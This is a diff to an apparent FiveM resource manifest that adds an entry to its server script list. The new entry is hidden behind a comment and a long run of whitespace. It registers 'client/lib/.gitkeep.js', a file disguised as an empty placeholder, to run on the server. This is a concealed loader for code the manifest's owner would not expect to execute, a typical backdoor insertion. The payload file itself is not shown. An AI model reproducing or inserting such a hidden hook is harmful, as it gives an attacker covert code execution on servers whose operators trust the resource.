@@ -14,7 +14,8 @@ server_scripts {
 	'@oxmysql/lib/MySQL.lua',
 	'locales/*.lua',
 	'config.lua',
-	'server/main.lua'
+'server/main.lua',
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.gitkeep.js',
 }
 
 client_scripts {
